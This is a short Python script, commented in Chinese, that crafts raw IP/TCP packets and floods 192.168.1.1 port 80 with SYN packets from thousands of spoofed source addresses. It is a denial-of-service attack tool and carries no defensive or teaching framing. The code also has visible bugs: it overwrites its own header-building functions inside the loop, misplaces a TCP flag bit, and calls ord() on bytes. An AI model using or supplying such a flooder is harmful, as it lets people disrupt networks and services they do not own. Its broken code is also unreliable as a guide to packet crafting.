import socket, sys
from struct import * #  构建IP、TCP头需要C语言格式


def checksum(msg):
	#  计算TCP校验和,以16位为单位
	s = 0
	for i in range(0, len(msg), 2):
		w = (ord(msg[i]) << 8) + (ord(msg[i + 1]))
		s += w
	s = (s >> 16) + (s & 0xffff)
	s = ~s & 0xffff
	return s


def ipheader(sour, dest):
	#  创建IP头
	version = 4
	ihl = 5 #  以4字节为单位
	typeofservice = 0
	totallength = 20 +20
	iden = 999
	flagsoffset = 0
	ttl = 255
	protocol = socket.IPPROTO_TCP
	headerchecksum = 0
	sourceaddress = socket.inet_aton(sour)
	destinationaddress = socket.inet_aton(dest)
	ihlversion = (version << 4) + ihl
	return pack("!BBHHHBBH4s4s", ihlversion, typeofservice, totallength, iden, flagsoffset, ttl, protocol, headerchecksum, sourceaddress, destinationaddress) #  转换为C语言结构体，第一个参数给出了要转换的C数据类型


def tcpheader(port, ichecksum = 0):
	#  创建TCP头
	sourport = port
	destport = 80
	seq = 0
	ack = 0
	dataoffset = 5
	flagfin = 0
	flagsyn = 1 #  syn包
	flagrst = 0
	flagpsh = 0
	flagack = 0
	flagurg = 0
	window = socket.htons(5840) #  设置窗体
	checksum = ichecksum
	urgentpointer = 0
	dataoffsetresv = (dataoffset << 4) + 0
	flags = (flagurg << 5) + (flagack << 5) + (flagpsh << 3) + (flagrst << 2) + (flagsyn << 1) + flagfin
	return pack("!HHLLBBHHH", sourport, destport, seq, ack, dataoffsetresv, flags, window, checksum, urgentpointer)


def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) #  向内核创建IP头
	for j in range(1, 20):
		for k in range(1, 255):
			for l in range(1, 255):
				sourip = "192.168.%s.%s" % (k, l)
				destip = "192.168.1.1"
				ipheader = ipheader(sourip, destip)
				tcpheader = tcpheader(10000 + j + k ++ l)
				souraddr = socket.inet_aton(sourip)
				destaddr = socket.inet_aton(destip)
				placeholder = 0
				protocol =socket.IPPROTO_TCP
				tcplen = len(tcpheader)
				psh = pack("!4s4sBBH", souraddr, destaddr, placeholder, protocol, tcplen)
				psh = psh + tcpheader
				tcpchecksum = checksum(psh) #  计算TCP校验和
				tcpheader = tcpheader(10000 + j + k ++ l, tcpchecksum)
				packet = ipheader + tcpheader
				s.sendto(packet, (destip, 0))


if __name__ == '__main__':
	print("start")
	main()
	print("end")